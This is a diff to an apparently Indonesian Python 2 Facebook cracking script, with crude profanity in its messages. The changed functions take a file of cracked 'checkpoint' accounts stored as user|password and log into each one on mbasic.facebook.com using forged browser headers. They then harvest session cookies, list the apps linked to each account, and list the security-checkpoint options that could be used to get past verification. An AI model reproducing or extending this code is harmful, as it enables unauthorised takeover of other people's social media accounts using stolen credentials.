@@ -190,7 +190,7 @@ def menu():
     elif asw == "7":
     	seting_yntkts()
     elif asw == "8":
-	cekopsi()
+        cek_opsi_sesi()
     elif asw == "9":
 	cekhasil()
     elif asw == "10":
@@ -403,57 +403,34 @@ def yo_ndak_tau_ko_tanya_saia():
         print '\n %s[%s!%s]\x1b[1;93m [Y/t] ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
 
 ####CEK OPSI HASIL CRACK####
-def cekopsi():
-	dirs = os.listdir("CP")
-	print("")
-	for file in dirs:
-		print(" [◉] CP/"+file)
-	print("\n [◉] masukan file (ex: CP/%s.txt)"%(tanggal))
-	files = raw_input(" [?] nama file  : ")
-	if files == "":
-		menu()
+def cek_opsi_sesi():
+	files = raw_input("\n %s[%s•%s] Masukan files yang berisi akun checkpoint\n %s[%s•%s] Files: "%(p,b,p,p,b,p))
 	try:
 		buka_baju = open(files, "r").readlines()
 	except IOError:
-		exit("\n [!] nama file %s tidak tersedia"%(files))
-	print('\n [!] anda bisa mematikan data selular untuk menjeda proses cek\n')
+		exit("\n%s [%s!%s] Files %s%s%s Tidak Ada!"%(p,m,p,h,files,p))
 	for memek in buka_baju:
 		kontol = memek.replace("\n","")
 		titid  = kontol.split("|")
-		print("\n [+] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
+		print("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Account : "+(kontol.replace(" + ","")))
 		try:
-			check_in(titid[0].replace("  * --> ",""), titid[1])
+			dekucheck(titid[0].replace(" + ",""), titid[1])
 		except requests.exceptions.ConnectionError:
 			pass
-	print("\n \x1b[1;92m[\x1b[1;91m!\x1b[1;92m] \x1b[1;93mcek akun \x1b[1;92msudah selesai...")
-	raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93menter untuk k\x1b[1;92membali ke menu ")
-	time.sleep(1)
-	menu()
-	
-def check_in(user, pasw):
-	mb = ("https://mbasic.facebook.com")
-	ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
-'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11'
-'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
-'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
-'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
-'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)'
-'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
-'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2'
-'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'
-'Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36'
+	os.remove('cp.txt')
+	exit("\n%s [%s!%s] Done Ya Anjing"%(p,m,p))
 
-])
+def dekucheck(user, pasw):
+	mb = ("https://mbasic.facebook.com")
+	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
 	ses = requests.Session()
-	#-> pemisah
+	# kntl bapackkau pecah
 	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 	data = {}
 	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
 	fm = ged.find("form",{"method":"post"})
 	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
-	for i in fm.find_all("raw_input"):
+	for i in fm.find_all("input"):
 		if i.get("name") in list:
 			data.update({i.get("name"):i.get("value")})
 		else:
@@ -461,33 +438,30 @@ def check_in(user, pasw):
 	data.update({"email":user,"pass":pasw})
 	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
 	if "c_user" in ses.cookies:
-		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
+		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
 		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
-		print(" [+] aplikasi terhubung ada : "+str(len(xe)))
+		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
 		num = 0
 		for _ in xe:
 			num += 1
-			print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
+			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
 	elif "checkpoint" in ses.cookies:
 		form = run.find("form")
-		dtsg = form.find("raw_input",{"name":"fb_dtsg"})["value"]
-		jzst = form.find("raw_input",{"name":"jazoest"})["value"]
-		nh   = form.find("raw_input",{"name":"nh"})["value"]
+		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
+		jzst = form.find("input",{"name":"jazoest"})["value"]
+		nh   = form.find("input",{"name":"nh"})["value"]
 		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
 		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
 		ngew = [yy.text for yy in xnxx.find_all("option")]
-		if "Lihat detail login yang ditampilkan. Ini Anda?" in str(xnxx):
-			print("\r  🌟 %sTinggal 1 langkah lagi untuk membuka akun facebook. silahkan buka di browser%s"%(H,N))
-		else:
-			print(" [+] terdapat "+str(len(ngew))+" opsi ")
-			for opt in range(len(ngew)):
-				print("  ["+str(opt+1)+"] "+ngew[opt])
+		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Total Opsi Yang Tersedia  "+str(len(ngew)))
+		for opt in range(len(ngew)):
+			print(" [\033[1;36m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
 	elif "login_error" in str(run):
 		oh = run.find("div",{"id":"login_error"}).find("div").text
-		print(" [!] %s"%(oh))
+		print("%s[%s!%s] %s"%(p,m,p,oh))
 	else:
-		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")
+		print("%s[%s!%s] Error Login Failed!\n"%(p,m,p))
 
 
 ### LAPOR BUG SCRIPT ###
